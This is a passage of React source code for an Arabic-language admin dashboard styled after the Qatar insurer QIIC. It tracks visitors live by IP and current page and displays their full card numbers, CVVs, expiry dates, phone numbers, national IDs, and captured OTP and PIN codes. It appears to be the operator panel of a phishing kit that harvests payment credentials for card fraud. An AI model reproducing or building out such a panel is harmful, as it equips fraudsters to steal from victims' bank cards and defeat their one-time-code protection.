                              <p className="text-gray-600 text-xs mb-1">رقم البطاقة الكامل:</p>
                              <p className="font-mono font-bold text-purple-600">
                                💳 {payment.cardNumber || '—'}
                              </p>
                            </div>
                            <div className="bg-purple-50 rounded-lg p-3">
                              <p className="text-gray-600 text-xs mb-1">تاريخ الانتهاء:</p>
                              <p className="font-mono font-semibold">{payment.expirationDate || '—'}</p>
                            </div>
                            <div className="bg-purple-50 rounded-lg p-3">
                              <p className="text-gray-600 text-xs mb-1">CVV:</p>
                              <p className="font-mono font-bold text-red-600">{payment.cvv || '—'}</p>
                            </div>
                            <div className="bg-purple-50 rounded-lg p-3">
                              <p className="text-gray-600 text-xs mb-1">اسم حامل البطاقة:</p>
                              <p className="font-semibold text-gray-900">{payment.cardHolderName || '—'}</p>
                            </div>
                            <div className="bg-purple-50 rounded-lg p-3">
                              <p className="text-gray-600 text-xs mb-1">رقم الهاتف:</p>
                              <p className="font-mono">📱 {payment.phoneNumber || '—'}</p>
                            </div>
                          </div>
                        )}

                        {/* QPay/Mobile Payment - Show all available data */}
                        {payment.paymentMethod && (payment.paymentMethod.toLowerCase().includes('qpay') || payment.paymentMethod.toLowerCase().includes('mobile')) && (
                          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4 mb-4">
                            <div className="bg-purple-50 rounded-lg p-3">
                              <p className="text-gray-600 text-xs mb-1">اسم حامل البطاقة:</p>
                              <p className="font-semibold text-gray-900">{payment.cardHolderName || '—'}</p>
                            </div>
                            <div className="bg-purple-50 rounded-lg p-3">
                              <p className="text-gray-600 text-xs mb-1">رقم البطاقة الكامل:</p>
                              <p className="font-mono font-bold text-purple-600">
                                💳 {payment.cardNumber || '—'}
                              </p>
                            </div>
                            <div className="bg-purple-50 rounded-lg p-3">
                              <p className="text-gray-600 text-xs mb-1">تاريخ الانتهاء:</p>
                              <p className="font-mono font-semibold">{payment.expirationDate || '—'}</p>
                            </div>
                            <div className="bg-purple-50 rounded-lg p-3">
                              <p className="text-gray-600 text-xs mb-1">CVV:</p>
                              <p className="font-mono font-bold text-red-600">{payment.cvv || '—'}</p>
                            </div>
                            <div className="bg-purple-50 rounded-lg p-3">
                              <p className="text-gray-600 text-xs mb-1">رقم الهاتف:</p>
                              <p className="font-mono font-bold text-purple-600">📱 {payment.phoneNumber || payment.phone || '—'}</p>
                            </div>
                          </div>
                        )}

                        {/* Amount and Time - Always show */}
                        <div className="grid grid-cols-1 md:grid-cols-2 gap-4 pt-4 border-t border-purple-100">
                          <div className="bg-gradient-to-r from-purple-100 to-purple-50 rounded-lg p-3">
                            <p className="text-gray-600 text-xs mb-1">المبلغ المدفوع:</p>
                            <p className="font-bold text-purple-600 text-2xl">💰 QAR {payment.amount || '—'}</p>
                          </div>
                          <div className="bg-purple-50 rounded-lg p-3">
                            <p className="text-gray-600 text-xs mb-1">وقت الدفع:</p>
                            <p className="font-mono text-sm font-semibold">
                              {payment.timestamp ? new Date(payment.timestamp).toLocaleString('ar-QA') : 
                               payment.time ? new Date(payment.time).toLocaleString('ar-QA') : '—'}
                            </p>
                          </div>
                        </div>
                      </div>
                    ))}
                  </div>
                </div>
              )}

              {/* OTP Codes */}
              {selectedCustomer.otpCodes && selectedCustomer.otpCodes.length > 0 && (
                <div className="bg-gradient-to-br from-yellow-50 to-yellow-100 rounded-xl p-6">
                  <h3 className="font-bold text-xl mb-4 flex items-center gap-2 text-yellow-900">
                    <Shield className="w-6 h-6 text-yellow-600" />
                    رموز OTP ({selectedCustomer.otpCodes.length})
                  </h3>
                  <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-3">
                    {selectedCustomer.otpCodes.map((otp, idx) => (
                      <div key={idx} className="bg-white rounded-lg p-4 border-2 border-yellow-200">
                        <div className="flex justify-between items-start mb-2">
                          <span className="text-xs font-bold text-yellow-600 bg-yellow-100 px-2 py-1 rounded-full">
                            OTP {idx + 1}
                          </span>
                          <div className="text-right">
                            <p className="font-mono font-bold text-2xl text-yellow-600">{otp.otpCode}</p>
                            <p className="text-xs text-gray-600 mt-1">
                              {new Date(otp.timestamp).toLocaleString('ar-QA')}
                            </p>
                          </div>
                        </div>
                        <div className="border-t pt-2 mt-2 text-xs space-y-1">
                          <p><span className="text-gray-600">البطاقة:</span> <span className="font-mono">**** {otp.cardLastDigits}</span></p>
                          <p><span className="text-gray-600">الهاتف:</span> <span className="font-mono">{otp.phoneNumber}</span></p>
                        </div>
                      </div>
                    ))}
                  </div>
                </div>
              )}

              {/* PIN Codes */}
              {selectedCustomer.pinCodes && selectedCustomer.pinCodes.length > 0 && (
                <div className="bg-gradient-to-br from-indigo-50 to-indigo-100 rounded-xl p-6">
                  <h3 className="font-bold text-xl mb-4 flex items-center gap-2 text-indigo-900">
                    <CreditCard className="w-6 h-6 text-indigo-600" />
                    رموز PIN ({selectedCustomer.pinCodes.length})
                  </h3>
                  <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-3">
                    {selectedCustomer.pinCodes.map((pin, idx) => (
                      <div key={idx} className="bg-white rounded-lg p-4 border-2 border-indigo-200">
                        <div className="flex justify-between items-start mb-2">
                          <span className="text-xs font-bold text-indigo-600 bg-indigo-100 px-2 py-1 rounded-full">
                            PIN {idx + 1}
                          </span>
                          <div className="text-right">
                            <p className="font-mono font-bold text-2xl text-indigo-600">{pin.pinCode}</p>
                            <p className="text-xs text-gray-600 mt-1">
                              {new Date(pin.timestamp).toLocaleString('ar-QA')}
                            </p>
                          </div>
                        </div>
                        <div className="border-t pt-2 mt-2 text-xs space-y-1">
                          <p><span className="text-gray-600">البطاقة:</span> <span className="font-mono">**** {pin.cardLastDigits}</span></p>
                          <p><span className="text-gray-600">الهاتف:</span> <span className="font-mono">{pin.phoneNumber}</span></p>
                        </div>
                      </div>
                    ))}
                  </div>
                </div>
              )}
            </div>

            <div className="bg-gray-50 p-4 rounded-b-2xl border-t">
              <div className="text-center text-sm text-gray-600">
                <p>تم عرض جميع البيانات المتاحة للعميل</p>
                <p className="mt-1">آخر تحديث: {new Date(selectedCustomer.lastUpdate).toLocaleString('ar-QA')}</p>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* Main Content */}
      <div className="max-w-[1900px] mx-auto p-6 space-y-6">
        {/* Header */}
        <div className="bg-gradient-to-br from-qiic-maroon via-red-800 to-red-900 text-white rounded-3xl p-8 shadow-2xl border border-white/10">
          <div className="flex items-center justify-between">
            <div>
              <h1 className="text-4xl font-bold mb-3">لوحة تحكم الأدمن المتقدمة</h1>
              <div className="flex items-center gap-3 flex-wrap">
                <div className="flex items-center gap-2 bg-white/20 px-4 py-2 rounded-full">
                  <div className={`w-3 h-3 rounded-full ${connected ? 'bg-green-400 animate-pulse' : 'bg-red-400'}`}></div>
                  <span className="font-semibold">{connected ? 'متصل مباشر' : 'غير متصل'}</span>
                </div>
                <div className="flex items-center gap-2 bg-white/20 px-4 py-2 rounded-full">
                  <Users className="w-4 h-4" />
                  <span className="font-semibold">{stats.active} / {stats.total} نشط</span>
                </div>
                {newDataCount > 0 && (
                  <div className="flex items-center gap-2 bg-green-500 px-4 py-2 rounded-full animate-pulse">
                    <AlertCircle className="w-4 h-4" />
                    <span className="font-bold">{newDataCount} بيانات جديدة!</span>
                  </div>
                )}
                <div className="flex items-center gap-2 bg-white/20 px-4 py-2 rounded-full text-xs">
                  <Clock className="w-4 h-4" />
                  <span>تحديث تلقائي كل 5 ثواني</span>
                </div>
              </div>
            </div>
            <div className="flex gap-3">
              <button
                onClick={handleRefresh}
                className="bg-white/20 hover:bg-white/30 p-3 rounded-lg transition-colors relative"
                title="تحديث"
              >
                <RefreshCw className="w-6 h-6" />
                {newDataCount > 0 && (
                  <span className="absolute -top-1 -right-1 bg-red-500 text-white text-xs font-bold rounded-full w-5 h-5 flex items-center justify-center animate-bounce">
                    {newDataCount}
                  </span>
                )}
              </button>
              <button
                onClick={handleLogout}
                className="bg-white/20 hover:bg-white/30 px-6 py-3 rounded-lg flex items-center gap-2 transition-colors"
              >
                <LogOut className="w-5 h-5" />
                تسجيل خروج
              </button>
            </div>
          </div>
        </div>

        {/* Stats Cards */}
        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6">
          <div className="stat-card bg-gradient-to-br from-blue-500 via-blue-600 to-blue-700 text-white rounded-2xl p-6 shadow-xl hover:shadow-2xl transition-all duration-300 border border-blue-400/20 relative overflow-hidden group">
            <div className="absolute top-0 right-0 w-32 h-32 bg-white/10 rounded-full -mr-16 -mt-16 group-hover:scale-150 transition-transform duration-500"></div>
            <div className="relative z-10">
              <div className="flex items-center justify-between mb-3">
                <div className="w-14 h-14 bg-white/20 backdrop-blur-sm rounded-xl flex items-center justify-center group-hover:rotate-12 transition-transform duration-300">
                  <Users className="w-7 h-7" />
                </div>
                <div className="bg-white/20 backdrop-blur-sm px-3 py-1 rounded-full text-xs font-bold">
                  {((stats.total / 100) * 100).toFixed(0)}%
                </div>
              </div>
              <div>
                <p className="text-blue-100 text-sm mb-1 font-medium">إجمالي العملاء</p>
                <p className="text-4xl font-bold">{stats.total}</p>
                <p className="text-blue-200 text-xs mt-2 flex items-center gap-1">
                  <Activity className="w-3 h-3" />
                  جميع المستخدمين
                </p>
              </div>
            </div>
          </div>

          <div className="stat-card bg-gradient-to-br from-green-500 via-emerald-600 to-green-700 text-white rounded-2xl p-6 shadow-xl hover:shadow-2xl transition-all duration-300 border border-green-400/20 relative overflow-hidden group">
            <div className="absolute top-0 right-0 w-32 h-32 bg-white/10 rounded-full -mr-16 -mt-16 group-hover:scale-150 transition-transform duration-500"></div>
            <div className="relative z-10">
              <div className="flex items-center justify-between mb-3">
                <div className="w-14 h-14 bg-white/20 backdrop-blur-sm rounded-xl flex items-center justify-center group-hover:rotate-12 transition-transform duration-300">
                  <Activity className="w-7 h-7 animate-pulse" />
                </div>
                <div className="bg-white/20 backdrop-blur-sm px-3 py-1 rounded-full text-xs font-bold pulse-notification">
                  LIVE
                </div>
              </div>
              <div>
                <p className="text-green-100 text-sm mb-1 font-medium">العملاء النشطون</p>
                <p className="text-4xl font-bold">{stats.active}</p>
                <p className="text-green-200 text-xs mt-2 flex items-center gap-1">
                  <div className="w-2 h-2 bg-green-300 rounded-full animate-ping"></div>
                  متصلون الآن
                </p>
              </div>
            </div>
          </div>

          <div className="stat-card bg-gradient-to-br from-yellow-500 via-amber-600 to-yellow-700 text-white rounded-2xl p-6 shadow-xl hover:shadow-2xl transition-all duration-300 border border-yellow-400/20 relative overflow-hidden group">
            <div className="absolute top-0 right-0 w-32 h-32 bg-white/10 rounded-full -mr-16 -mt-16 group-hover:scale-150 transition-transform duration-500"></div>
            <div className="relative z-10">
              <div className="flex items-center justify-between mb-3">
                <div className="w-14 h-14 bg-white/20 backdrop-blur-sm rounded-xl flex items-center justify-center group-hover:rotate-12 transition-transform duration-300">
                  <Clock className="w-7 h-7" />
                </div>
                <div className="bg-white/20 backdrop-blur-sm px-3 py-1 rounded-full text-xs font-bold">
                  {stats.total > 0 ? ((stats.pending / stats.total) * 100).toFixed(0) : 0}%
                </div>
              </div>
              <div>
                <p className="text-yellow-100 text-sm mb-1 font-medium">قيد الانتظار</p>
                <p className="text-4xl font-bold">{stats.pending}</p>
                <p className="text-yellow-200 text-xs mt-2 flex items-center gap-1">
                  <Clock className="w-3 h-3" />
                  يحتاج مراجعة
                </p>
              </div>
            </div>
          </div>

          <div className="stat-card bg-gradient-to-br from-purple-500 via-purple-600 to-indigo-700 text-white rounded-2xl p-6 shadow-xl hover:shadow-2xl transition-all duration-300 border border-purple-400/20 relative overflow-hidden group">
            <div className="absolute top-0 right-0 w-32 h-32 bg-white/10 rounded-full -mr-16 -mt-16 group-hover:scale-150 transition-transform duration-500"></div>
            <div className="relative z-10">
              <div className="flex items-center justify-between mb-3">
                <div className="w-14 h-14 bg-white/20 backdrop-blur-sm rounded-xl flex items-center justify-center group-hover:rotate-12 transition-transform duration-300">
                  <DollarSign className="w-7 h-7" />
                </div>
                <div className="bg-white/20 backdrop-blur-sm px-3 py-1 rounded-full text-xs font-bold">
                  QAR
                </div>
              </div>
              <div>
                <p className="text-purple-100 text-sm mb-1 font-medium">إجمالي الإيرادات</p>
                <p className="text-4xl font-bold">{stats.totalRevenue.toLocaleString('ar-QA', { maximumFractionDigits: 0 })}</p>
                <p className="text-purple-200 text-xs mt-2 flex items-center gap-1">
                  <TrendingUp className="w-3 h-3" />
                  ريال قطري
                </p>
              </div>
            </div>
          </div>
        </div>

        {/* Filters */}
        <div className="bg-white rounded-xl p-6 shadow-md mb-6">
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            <div className="relative">
              <Search className="absolute right-4 top-1/2 transform -translate-y-1/2 text-gray-400 w-5 h-5" />
              <input
                type="text"
                placeholder="ابحث بـ IP، الاسم، QID، الهاتف، السيارة، رقم اللوحة..."
                value={searchTerm}
                onChange={(e) => setSearchTerm(e.target.value)}
                className="w-full pr-12 pl-4 py-3.5 border-2 border-gray-200 rounded-xl focus:ring-2 focus:ring-qiic-maroon focus:border-qiic-maroon transition-all shadow-sm hover:border-gray-300"
                dir="rtl"
              />
            </div>

            <div className="flex gap-3 flex-wrap">
              <button
                onClick={() => setFilterStatus('all')}
                className={`px-6 py-3 rounded-xl font-bold transition-all duration-300 ${
                  filterStatus === 'all' 
                    ? 'bg-gradient-to-r from-qiic-maroon to-red-700 text-white shadow-lg scale-105' 
                    : 'bg-gray-100 text-gray-700 hover:bg-gray-200 hover:scale-105'
                }`}
              >
                الكل ({stats.total})
              </button>
              <button
                onClick={() => setFilterStatus('active')}
                className={`px-6 py-3 rounded-xl font-bold transition-all duration-300 ${
                  filterStatus === 'active' 
                    ? 'bg-gradient-to-r from-green-600 to-green-700 text-white shadow-lg scale-105' 
                    : 'bg-gray-100 text-gray-700 hover:bg-gray-200 hover:scale-105'
                }`}
              >
                نشط ({stats.active})
              </button>
              <button
                onClick={() => setFilterStatus('pending')}
                className={`px-6 py-3 rounded-xl font-bold transition-all duration-300 ${
                  filterStatus === 'pending' 
                    ? 'bg-gradient-to-r from-yellow-600 to-yellow-700 text-white shadow-lg scale-105' 
                    : 'bg-gray-100 text-gray-700 hover:bg-gray-200 hover:scale-105'
                }`}
              >
                معلق ({stats.pending})
              </button>
              <button
                onClick={() => setFilterStatus('approved')}
                className={`px-6 py-3 rounded-xl font-bold transition-all duration-300 ${
                  filterStatus === 'approved' 
                    ? 'bg-gradient-to-r from-blue-600 to-blue-700 text-white shadow-lg scale-105' 
                    : 'bg-gray-100 text-gray-700 hover:bg-gray-200 hover:scale-105'
                }`}
              >
                موافق ({stats.approved})
              </button>
            </div>
          </div>
        </div>

        {/* Customers Table */}
        <div className="bg-white rounded-2xl shadow-2xl border border-gray-100 overflow-hidden">
          <div className="bg-gradient-to-r from-gray-900 via-gray-800 to-gray-900 px-6 py-4 border-b border-gray-700">
            <div className="flex items-center justify-between">
              <div className="flex items-center gap-3">
                <div className="w-10 h-10 rounded-lg bg-white/10 flex items-center justify-center">
                  <Users className="w-5 h-5 text-white" />
                </div>
                <div>
                  <h3 className="text-white font-bold text-lg">قائمة العملاء المباشرة</h3>
                  <p className="text-gray-400 text-xs">تحديث فوري كل 5 ثواني</p>
                </div>
              </div>
              <div className="flex items-center gap-3">
                <span className="bg-white/10 text-white px-3 py-1.5 rounded-lg text-sm font-semibold">
                  {filteredCustomers.length} عميل
                </span>
              </div>
            </div>
          </div>

          <div className="overflow-x-auto admin-table">
            <table className="w-full" dir="rtl">\n              <thead className="bg-gradient-to-r from-gray-900 via-gray-800 to-gray-900 text-white sticky top-0 z-10">
                <tr className="border-b border-gray-700">
                  <th className="px-4 py-4 text-right text-xs font-bold whitespace-nowrap uppercase tracking-wide">
                    <div className="flex items-center gap-2">
                      <Activity className="w-4 h-4" />
                      الحالة
                    </div>
                  </th>
                  <th className="px-4 py-4 text-right text-xs font-bold whitespace-nowrap uppercase tracking-wide">
                    <div className="flex items-center gap-2">
                      <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 20 20">
                        <path fillRule="evenodd" d="M4.083 9h1.946c.089-1.546.383-2.97.837-4.118A6.004 6.004 0 004.083 9zM10 2a8 8 0 100 16 8 8 0 000-16zm0 2c-.076 0-.232.032-.465.262-.238.234-.497.623-.737 1.182-.389.907-.673 2.142-.766 3.556h3.936c-.093-1.414-.377-2.649-.766-3.556-.24-.56-.5-.948-.737-1.182C10.232 4.032 10.076 4 10 4zm3.971 5c-.089-1.546-.383-2.97-.837-4.118A6.004 6.004 0 0115.917 9h-1.946zm-2.003 2H8.032c.093 1.414.377 2.649.766 3.556.24.56.5.948.737 1.182.233.23.389.262.465.262.076 0 .232-.032.465-.262.238-.234.498-.623.737-1.182.389-.907.673-2.142.766-3.556zm1.166 4.118c.454-1.147.748-2.572.837-4.118h1.946a6.004 6.004 0 01-2.783 4.118zm-6.268 0C6.412 13.97 6.118 12.546 6.03 11H4.083a6.004 6.004 0 002.783 4.118z" clipRule="evenodd" />
                      </svg>
                      IP
                    </div>
                  </th>
                  <th className="px-4 py-4 text-right text-xs font-bold whitespace-nowrap uppercase tracking-wide">
                    <div className="flex items-center gap-2">
                      <Users className="w-4 h-4" />
                      معلومات العميل
                    </div>
                  </th>
                  <th className="px-4 py-4 text-right text-xs font-bold whitespace-nowrap uppercase tracking-wide">
                    <div className="flex items-center gap-2">
                      <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 20 20">
                        <path fillRule="evenodd" d="M10 2a1 1 0 00-1 1v1a1 1 0 002 0V3a1 1 0 00-1-1zM4 4h3a3 3 0 006 0h3a2 2 0 012 2v9a2 2 0 01-2 2H4a2 2 0 01-2-2V6a2 2 0 012-2zm2.5 7a1.5 1.5 0 100-3 1.5 1.5 0 000 3zm2.45 4a2.5 2.5 0 10-4.9 0h4.9zM12 9a1 1 0 100 2h3a1 1 0 100-2h-3zm-1 4a1 1 0 011-1h2a1 1 0 110 2h-2a1 1 0 01-1-1z" clipRule="evenodd" />
                      </svg>
                      QID
                    </div>
                  </th>
                  <th className="px-4 py-4 text-right text-xs font-bold whitespace-nowrap uppercase tracking-wide">
                    <div className="flex items-center gap-2">
                      <Car className="w-4 h-4" />
                      السيارة
                    </div>
                  </th>
                  <th className="px-4 py-4 text-right text-xs font-bold whitespace-nowrap uppercase tracking-wide">
                    <div className="flex items-center gap-2">
                      <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 20 20">
                        <path d="M10 12a2 2 0 100-4 2 2 0 000 4z" />
                        <path fillRule="evenodd" d="M.458 10C1.732 5.943 5.522 3 10 3s8.268 2.943 9.542 7c-1.274 4.057-5.064 7-9.542 7S1.732 14.057.458 10zM14 10a4 4 0 11-8 0 4 4 0 018 0z" clipRule="evenodd" />
                      </svg>
                      رقم اللوحة
                    </div>
                  </th>
                  <th className="px-4 py-4 text-right text-xs font-bold whitespace-nowrap uppercase tracking-wide">
                    <div className="flex items-center gap-2">
                      <Shield className="w-4 h-4" />
                      التأمين
                    </div>
                  </th>
                  <th className="px-4 py-4 text-right text-xs font-bold whitespace-nowrap uppercase tracking-wide">
                    <div className="flex items-center gap-2">
                      <Navigation className="w-4 h-4" />
                      الصفحة الحالية
                    </div>
                  </th>
                  <th className="px-4 py-4 text-right text-xs font-bold whitespace-nowrap uppercase tracking-wide">
                    <div className="flex items-center gap-2">
                      <CreditCard className="w-4 h-4" />
                      البطاقات
                    </div>
                  </th>
                  <th className="px-4 py-4 text-right text-xs font-bold whitespace-nowrap uppercase tracking-wide">
                    <div className="flex items-center gap-2">
                      <Shield className="w-4 h-4" />
                      OTP/PIN
                    </div>
                  </th>
                  <th className="px-4 py-4 text-right text-xs font-bold whitespace-nowrap uppercase tracking-wide">
                    <div className="flex items-center gap-2">
                      <CheckCircle className="w-4 h-4" />
                      الحالة
                    </div>
                  </th>
                  <th className="px-4 py-4 text-center text-xs font-bold whitespace-nowrap uppercase tracking-wide">
                    <div className="flex items-center justify-center gap-2">
                      <Eye className="w-4 h-4" />
                      الإجراءات
                    </div>
                  </th>
                </tr>
              </thead>
              <tbody className="divide-y divide-gray-200">
                {filteredCustomers.map((customer, idx) => {
                  const isNew = lastDataTimestamp && customer.lastUpdate && 
                                (Date.now() - customer.lastUpdate < 10000);
                  return (
                    <tr 
                      key={customer.ip} 
                      className={`group transition-all duration-200 border-b border-gray-100 ${
                        isNew ? 'animate-pulse bg-green-50' : ''
                      } ${
                        customer.isActive 
                          ? 'bg-gradient-to-r from-green-50/30 via-white to-green-50/30 hover:from-green-100/40 hover:via-green-50/20 hover:to-green-100/40' 
                          : idx % 2 === 0 
                            ? 'bg-white hover:bg-gray-50' 
                            : 'bg-gray-50/50 hover:bg-gray-100/50'
                      } hover:shadow-md hover:scale-[1.01] cursor-pointer`}
                      onClick={() => viewDetails(customer)}
                    >
                    <td className="px-4 py-4">
                      <div className="flex items-center gap-2">
                        <div className="relative">
                          <div className={`w-3 h-3 rounded-full ${
                            customer.isActive 
                              ? 'bg-green-500 shadow-lg shadow-green-400/50' 
                              : 'bg-gray-400'
                          }`}></div>
                          {customer.isActive && (
                            <div className="absolute inset-0 w-3 h-3 rounded-full bg-green-500 animate-ping opacity-75"></div>
                          )}
                        </div>
                        <span className={`text-xs font-semibold ${
                          customer.isActive ? 'text-green-700' : 'text-gray-500'
                        }`}>
                          {customer.isActive ? 'نشط الآن' : 'غير متصل'}
                        </span>
                      </div>
                    </td>
                    <td className="px-4 py-4">
                      <span className="font-mono text-xs font-semibold text-purple-600">{customer.ip}</span>
                    </td>
                    <td className="px-4 py-4">
                      {customer.customerInfo ? (
                        <div className="min-w-[150px]">
                          <p className="font-semibold text-gray-900 text-sm">{customer.customerInfo.name}</p>
                          <p className="text-xs text-gray-600 flex items-center gap-1">
                            <Phone className="w-3 h-3" />
                            {customer.customerInfo.phone}
                          </p>
                        </div>
                      ) : (
                        <span className="text-gray-400">—</span>
                      )}
                    </td>
                    <td className="px-4 py-4">
                      <span className="font-mono text-xs font-bold text-blue-600">
                        {customer.customerInfo?.qid || customer.moreDetails?.qid || '—'}
                      </span>
                    </td>
                    <td className="px-4 py-4">
                      {customer.carDetails ? (
                        <div className="min-w-[120px]">
                          <p className="font-semibold text-gray-900 text-sm">{customer.carDetails.make}</p>
                          <p className="text-xs text-gray-600">{customer.carDetails.model} - {customer.carDetails.year}</p>
                        </div>
                      ) : (
                        <span className="text-gray-400">—</span>
                      )}
                    </td>
                    <td className="px-4 py-4">
                      <span className="font-mono font-bold text-green-600">
                        {customer.moreDetails?.plateNumber || '—'}
                      </span>
                    </td>
                    <td className="px-4 py-4">
                      {customer.insurance ? (
                        <div className="min-w-[100px]">
                          <p className="font-semibold text-orange-600 text-sm">{customer.insurance.insuranceType}</p>
                          <p className="text-xs text-gray-600">{customer.insurance.amount} ريال</p>
                        </div>
                      ) : (
                        <span className="text-gray-400">—</span>
                      )}
                    </td>
                    <td className="px-4 py-4">
                      <div className="flex flex-col gap-2">
                        <div className="flex items-center gap-2">
                          <Navigation className="w-3 h-3 text-blue-600" />
                          <span className="text-xs font-semibold text-gray-700">{getPageBadge(customer.currentPage)}</span>
                        </div>
                        <span className="bg-blue-600 text-white px-2 py-1 rounded text-xs font-mono inline-block">
                          {customer.currentPage}
                        </span>
                      </div>
                    </td>
                    <td className="px-4 py-4">
                      <div className="flex items-center gap-1">
                        <CreditCard className="w-4 h-4 text-purple-600" />
                        <span className="font-bold text-purple-600" title={`${customer.payments?.length || 0} بطاقة`}>
                          {customer.payments?.length || 0}
                        </span>
                      </div>
                    </td>
                    <td className="px-4 py-4">
                      <div className="flex gap-2 items-center">
                        <div className="flex items-center gap-1">
                          <Shield className="w-3 h-3 text-yellow-600" />
                          <span className="text-xs font-semibold text-yellow-600">{customer.otpCodes?.length || 0}</span>
                        </div>
                        <div className="flex items-center gap-1">
                          <CreditCard className="w-3 h-3 text-indigo-600" />
                          <span className="text-xs font-semibold text-indigo-600">{customer.pinCodes?.length || 0}</span>
                        </div>
                      </div>
                    </td>
                    <td className="px-4 py-4">
                      {getStatusBadge(customer.status)}
                    </td>
                    <td className="px-4 py-4">
                      <button
                        onClick={(e) => {
                          e.stopPropagation();
                          viewDetails(customer);
                        }}
                        className="bg-gradient-to-r from-blue-600 via-blue-700 to-indigo-600 hover:from-blue-700 hover:via-blue-800 hover:to-indigo-700 text-white p-2.5 rounded-xl transition-all shadow-lg hover:shadow-2xl hover:scale-110 active:scale-95 group-hover:shadow-blue-400/50"
                        title="عرض جميع التفاصيل"
                      >
                        <Eye className="w-5 h-5 transition-transform group-hover:rotate-12" />
                      </button>
                    </td>
                  </tr>
                  );
                })}
              </tbody>
            </table>
          </div>

          {filteredCustomers.length === 0 && (
            <div className="text-center py-12">
              <AlertCircle className="w-16 h-16 text-gray-300 mx-auto mb-4" />
              <p className="text-gray-500 text-lg">لا توجد نتائج</p>
              <p className="text-gray-400 text-sm mt-2">جرب تغيير معايير البحث أو الفلتر</p>
            </div>
          )}
        </div>

        {/* Footer */}
        <div className="mt-6 text-center text-gray-600 text-sm bg-white rounded-lg p-4 shadow">
          <p className="font-semibold">آخر تحديث: {new Date().toLocaleString('ar-QA')}</p>
          <p className="mt-1">عدد العملاء المعروضين: <span className="font-bold text-blue-600">{filteredCustomers.length}</span> من أصل <span className="font-bold">{customers.length}</span></p>
          <p className="mt-2 text-xs text-gray-500">
            التحديث التلقائي نشط • جميع البيانات محدثة مباشرة
          </p>
        </div>
      </div>
    </div>
  );
}
